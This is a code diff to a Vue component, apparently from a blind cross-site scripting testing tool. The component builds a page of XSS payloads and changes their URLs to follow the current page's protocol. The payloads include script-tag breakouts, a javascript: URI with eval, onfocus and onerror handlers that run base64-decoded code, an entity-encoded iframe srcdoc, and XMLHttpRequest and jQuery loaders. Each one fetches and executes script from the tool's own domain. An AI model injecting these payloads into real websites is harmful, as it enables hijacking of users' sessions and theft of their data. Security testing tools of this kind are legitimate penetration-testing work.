@@ -6,6 +6,7 @@
                     <div class="row pl-4 pr-4 p-2" style="display: block;">
                         <div>
                             <h1><i class="fas fa-file-code"></i> XSS Payloads</h1>
+                            {{this.http_warning}}
                         </div>
                         <card v-for="payload in payloads">
                             <h4 class="card-title" v-html="payload.title"></h4>
@@ -82,13 +83,13 @@ export default {
     watch: {},
     methods: {
         js_attrib: function() {
-            return 'var a=document.createElement("script");a.src="https://' + this.base_domain + '";document.body.appendChild(a);';
+            return 'var a=document.createElement("script");a.src="' + location.protocol + '//' + this.base_domain + '";document.body.appendChild(a);';
         },
         basic_script: function() {
-            return "\"><script src=\"https://" + this.base_domain + "\"><\/script>";
+            return "\"><script src=\"" + location.protocol + "//" + this.base_domain + "\"><\/script>";
         },
         javascript_uri: function() {
-            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + this.base_domain + "\\';document.body.appendChild(a)')";
+            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'" + location.protocol + "//" + this.base_domain + "\\';document.body.appendChild(a)')";
         },
         input_onfocus: function() {
             return "\"><input onfocus=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + " autofocus>";
@@ -100,13 +101,13 @@ export default {
             return "\"><video><source onerror=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + ">";
         },
         iframe_srcdoc: function() {
-            return "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;" + this.base_domain + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
+            return "\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;" + (location.protocol === "https:" ? "&#115;" : "") + "&#58;&#47;&#47;" + this.base_domain + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">";
         },
         xmlhttprequest_load: function() {
-            return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://' + this.base_domain + '");a.send();<\/script>'
+            return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "' + location.protocol + '//' + this.base_domain + '");a.send();<\/script>'
         },
         jquery_chainload: function() {
-            return '<script>$.getScript("https://' + this.base_domain + '")<\/script>';
+            return '<script>$.getScript("' + location.protocol + '//' + this.base_domain + '")<\/script>';
         },
     },
     computed: {},
@@ -117,6 +118,12 @@ export default {
 
         // Base domain
         this.base_domain = api_request.BASE_DOMAIN;
+
+        if (location.protocol !== "https:") {
+            this.http_warning = "You are not using HTTPS all your payloads reflect that. If you meant to have HTTPS please visit the admin page with HTTPS";
+        } else {
+            this.http_warning = "";
+        }
     },
     beforeDestroy() {}
 };
